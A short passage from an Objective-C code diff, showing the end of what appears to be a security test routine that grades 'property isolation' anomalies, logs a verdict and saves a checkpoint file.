+            else if (anomalies >= 1) verdict = @"MEDIUM — partial chain anomaly";
+            else verdict = @"LOW — property isolation effective across transfer";
+            log([NSString stringWithFormat:@"PROPCHAIN: VERDICT: %@", verdict]);
+
+            NSDictionary *res = @{
+                @"status": isr_stopped() ? @"STOPPED" : @"DONE",
+                @"anomalies": @(anomalies),
+                @"verdict": verdict,
+                @"elapsed": @(elapsed)
+            };
+            isr_checkpoint(@"ISR-PortPropChain-checkpoint.json", res);
+            isr_unload(&sym);
+            done(res);
+        }
+    });
+}
